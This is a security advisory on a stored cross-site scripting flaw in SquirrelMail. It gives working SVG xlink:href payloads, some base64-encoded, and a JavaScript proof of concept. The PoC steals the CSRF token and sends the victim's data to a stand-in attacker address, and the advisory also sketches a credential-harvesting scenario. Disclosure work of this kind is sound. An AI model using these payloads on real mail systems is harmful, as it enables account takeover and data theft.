**Abstract**<br>
SquirrelMail allows to display HTML messages provided that non-safe fragments are redacted. An input sanitization vulnerability that can be exploited to perform stored cross-site scripting (XSS) attacks has been discovered.

A remote attacker can send a specially crafted e-mail containing malicious HTML and execute arbitrary JavaScript code in the context of the vulnerable webmail interface when the user displays the message. This basically grants the attacker the same privileges of the authenticated victim, in particular this enables to (among other things): send e-mail messages on the behalf of the victim, fetch conversations from folders, delete or otherwise manage messages, log the victim out of SquirrelMail, etc.

It is likely that even prior versions are affected since this does not appear to be a regression but merely an insufficient implementation.

**Details**<br>
The HTML sanitizer uses a blacklist approach based on tag and attributes names to recognize potentially dangerous HTML code and decide how to fix it, for example, attributes starting with on are removed as they usually represent events. In particular, the &lt;script> element is deleted and the href attribute can only assume certain schemes (e.g., not javascript:) otherwise it is replaced with a void image URL.

It is possible to bypass these checks by using the SVG counterpart of the &lt;a> and &lt;script> elements. This variant exposes the href attribute as part of the xlink namespace (for the latter it allows to specify the resource containing the script code) therefore it can be accessed with xlink:href which is ignored by SquirrelMail. Moreover, in this context &lt;script> can be self-closing and the lack of closing tag is enough to deceive the sanitizer.

Two methods have been devised, to maximize the chances of success it may be advisable to employ both.

**Credit**<br>
An independent security researcher, Andrea Cardaci, has reported this vulnerability to SSD Secure Disclosure program.

**Affected versions**<br>
SquirrelMail version 1.4.23 (SM-1_4-STABLE @ r14746)<br>
SquirrelMail version 1.5.2 (trunk @ r14747)<br>

No user action required
This solution only works with Firefox and Edge [1] and requires no additional interaction from of the user:

```html
<svg><script xlink:href="data:text/javascript,alert(1)"/></svg>
<svg><script xlink:href="data:text/javascript;base64,YWxlcnQoMSk="/></svg>
```
Arbitrarily complex code can be deployed by using the Base64 format of the Data URL scheme.

**User action required**<br>
This solution has been tested with all major browsers and requires the user to click on an anchor element:

```html
<svg>
<a xlink:href="javascript:alert(1)">
<text y="1em">CLICK ME</text>
</a>
</svg>
<svg>
<a xlink:href="javascript:eval(atob('YWxlcnQoMSk='))">
<text y="1em">CLICK ME</text>
</a>
</svg>
```
Arbitrarily complex code can be deployed by evaluating a decoded Base64 string.

Additionally, to mimic the look and feel of a regular link, the following attributes of the text element can be used:
```css
fill="#0000cc" text-decoration="underline" cursor="pointer"
```

**A note about Firefox**<br>
The HTML sanitizer adds the target=”_blank” attribute to links, in Firefox this means that even javascript: URLs are evaluated in a new tab. Luckily it is possible to obtain the original frame using the window.opener property and possibly close the new window afterwards.

To increase the chances of success the JavaScript payload should look like this:
```JavaScript
// get the real window
const _window = window.opener || window;
// ...
// close the new window, if any
if (window.opener) {
  close();
}
```

**Limitations**<br>
The HTML visualization of messages in SquirrelMail is not enabled by default, users of the stable version need to enable it globally[2] whereas in the development version it can also be toggled for single messages[3]. Nowadays HTML e-mails are sadly widespread so it is reasonable to assume that most users are willing to properly display them.

**Proof of concept**<br>
This proof of concept (PoC) shows how it is possible to trick SquirrelMail in sending arbitrary e-mails on the behalf of a SquirrelMail user.

To prevent cross-site request forgery, SquirrelMail employs per-user security tokens, this is not a problem in this scenario since the valid token can be easily obtained from the current page using this JavaScript snippet:

```JavaScript
document.querySelector('a[href^="/src/delete_message.php"]').href
.match(/.*smtoken=([^&]+).*/)[1];
```
The administrator may decide to enable a per-action token generation instead[4], in this case a token can be obtained with:
```JavaScript
document.querySelector('input[name="smtoken"]').value;
```

The following JavaScript payload takes into account the aforementioned considerations:
```javascript
(function() {
  async function send(data, to) {
    // get the real document
    const _window = window.opener || window;
    const _document = _window.document;
    // fetch the security token from the current page
    let token;
    try {
     token = _document.querySelector('a[href^="/src/delete_message.php"]')
     .href.match(/.*smtoken=([^&]+).*/)[1];
    } catch (err) {}
    try {
     token = _document.querySelector('input[name="smtoken"]').value;
    } catch (err) {}
    // prepare the form data
    const form = new FormData();
    form.append('smtoken', token);
    form.append('send_to', to);
    form.append('body', data);
    form.append('identity', '0');
    form.append('send', 'Send');
    form.append('send1', 'Send');
    form.append('send_button_count', '1');
    // send the message
    await fetch(`${_window.location.origin}/src/compose.php`, {
      credentials: 'include',
      method: 'POST',
      body: form
    });
    // close the new window if needed
    if (window.opener) {
      close();
    }
  }

  send('EXFILTRATED_DATA', 'attacker@localhost');
})()
```
The payload[5]
can be Base64-encoded and the HTML message can be crafted as follows:
```JavaScript
<svg><script xlink:href="data:text/javascript;base64,KGZ1bmN0aW9uKCkge2FzeW5jIGZ1bmN0aW9uIH c
NlbmQoZGF0YSwgdG8pIHtjb25zdCBfd2luZG93ID0gd2luZG93Lm9wZW5lciB8fCB3aW5kb3c7IGNvbnN0IF9kb c
2N1bWVudCA9IF93aW5kb3cuZG9jdW1lbnQ7IGxldCB0b2tlbjsgdHJ5IHt0b2tlbiA9IF9kb2N1bWVudC5xdWVy c
eVNlbGVjdG9yKCdhW2hyZWZePSIvc3JjL2RlbGV0ZV9tZXNzYWdlLnBocCJdJykuaHJlZi5tYXRjaCgvLipzbXR c
va2VuPShbXiZdKykuKi8pWzFdO30gY2F0Y2ggKGVycikge30gdHJ5IHt0b2tlbiA9IF9kb2N1bWVudC5xdWVyeV c
NlbGVjdG9yKCdpbnB1dFtuYW1lPSJzbXRva2VuIl0nKS52YWx1ZTt9IGNhdGNoIChlcnIpIHt9IGNvbnN0IGZvc c
m0gPSBuZXcgRm9ybURhdGEoKTsgZm9ybS5hcHBlbmQoJ3NtdG9rZW4nLCB0b2tlbik7IGZvcm0uYXBwZW5kKCdz c
ZW5kX3RvJywgdG8pOyBmb3JtLmFwcGVuZCgnYm9keScsIGRhdGEpOyBmb3JtLmFwcGVuZCgnaWRlbnRpdHknLCA c
nMCcpOyBmb3JtLmFwcGVuZCgnc2VuZCcsICdTZW5kJyk7IGZvcm0uYXBwZW5kKCdzZW5kMScsICdTZW5kJyk7IG c
Zvcm0uYXBwZW5kKCdzZW5kX2J1dHRvbl9jb3VudCcsICcxJyk7IGF3YWl0IGZldGNoKGAke193aW5kb3cubG9jY c
XRpb24ub3JpZ2lufS9zcmMvY29tcG9zZS5waHBgLCB7Y3JlZGVudGlhbHM6ICdpbmNsdWRlJywgbWV0aG9kOiAn c
UE9TVCcsIGJvZHk6IGZvcm19KTsgaWYgKHdpbmRvdy5vcGVuZXIpIHtjbG9zZSgpO319IHNlbmQoJ0VYRklMVFJ c
BVEVEX0RBVEEnLCAnYXR0YWNrZXJAbG9jYWxob3N0Jyk7fSkoKQ=="/></svg>
<svg><a xlink:href="javascript:eval(atob('KGZ1bmN0aW9uKCkge2FzeW5jIGZ1bmN0aW9uIHNlbmQoZGF0Y c
SwgdG8pIHtjb25zdCBfd2luZG93ID0gd2luZG93Lm9wZW5lciB8fCB3aW5kb3c7IGNvbnN0IF9kb2N1bWVudCA9 c
IF93aW5kb3cuZG9jdW1lbnQ7IGxldCB0b2tlbjsgdHJ5IHt0b2tlbiA9IF9kb2N1bWVudC5xdWVyeVNlbGVjdG9 c
yKCdhW2hyZWZePSIvc3JjL2RlbGV0ZV9tZXNzYWdlLnBocCJdJykuaHJlZi5tYXRjaCgvLipzbXRva2VuPShbXi c
ZdKykuKi8pWzFdO30gY2F0Y2ggKGVycikge30gdHJ5IHt0b2tlbiA9IF9kb2N1bWVudC5xdWVyeVNlbGVjdG9yK c
CdpbnB1dFtuYW1lPSJzbXRva2VuIl0nKS52YWx1ZTt9IGNhdGNoIChlcnIpIHt9IGNvbnN0IGZvcm0gPSBuZXcg c
Rm9ybURhdGEoKTsgZm9ybS5hcHBlbmQoJ3NtdG9rZW4nLCB0b2tlbik7IGZvcm0uYXBwZW5kKCdzZW5kX3RvJyw c
gdG8pOyBmb3JtLmFwcGVuZCgnYm9keScsIGRhdGEpOyBmb3JtLmFwcGVuZCgnaWRlbnRpdHknLCAnMCcpOyBmb3 c
JtLmFwcGVuZCgnc2VuZCcsICdTZW5kJyk7IGZvcm0uYXBwZW5kKCdzZW5kMScsICdTZW5kJyk7IGZvcm0uYXBwZ c
W5kKCdzZW5kX2J1dHRvbl9jb3VudCcsICcxJyk7IGF3YWl0IGZldGNoKGAke193aW5kb3cubG9jYXRpb24ub3Jp c
Z2lufS9zcmMvY29tcG9zZS5waHBgLCB7Y3JlZGVudGlhbHM6ICdpbmNsdWRlJywgbWV0aG9kOiAnUE9TVCcsIGJ c
vZHk6IGZvcm19KTsgaWYgKHdpbmRvdy5vcGVuZXIpIHtjbG9zZSgpO319IHNlbmQoJ0VYRklMVFJBVEVEX0RBVE c
EnLCAnYXR0YWNrZXJAbG9jYWxob3N0Jyk7fSkoKQ=='))"><text fill="#0000cc"
text-decoration="underline" cursor="pointer" y="1em">CLICK ME</text></a></svg>
```

It is likewise possible to retrieve sensitive data by fetching the proper URL[6], for example:
* /src/right_main.php?showall=1&mailbox=INBOX to obtain the message list;
* /src/read_body.php?mailbox=INBOX&passed_id=<messageid> to obtain the message content.

A possible attack scenario would be to fetch all the message identifiers from the first URL, then use the second to fetch individual messages and finally use the above send function to exfiltrate this data [7]

**Bonus scenario**<br>
Another interesting attack scenario takes advantage of the fact that browsers prompt to save the login credentials, the attacker could craft a fake and invisible login form to harvest them. This is particularly worrisome if SquirrelMail is used as a system mail interface where credentials are actual system credentials that might grant access to other services, e.g., SSH, FTP, etc.

**Countermeasures**<br>
Users should refrain from displaying HTML e-mails in SquirrelMail. At the very least, authors should treat the xlink:href attribute the same way as href.

**Notes**<br>
[1] Tested with Firefox version 57.0.1 and Edge version 41.16299.15.0. Apparently, this is a specification misinterpretation by Chrome and others.<br>
[2] Options -> Display Preferences -> Show HTML Version by Default; this vulnerability can also be used to set this option once triggered the first time.<br>
[3] Because the “View as HTML” plugin has been included in that version.<br>
[4] By setting $do_not_use_single_token to TRUE in config/config_local.php.<br>
[5] The destination account does not need to be on the same server, attacker@localhost is used just for the sake of the example.<br>
[6] These URLs may differ across versions.<br>
[7] Not implemented in this PoC for the sake of brevity.<br>
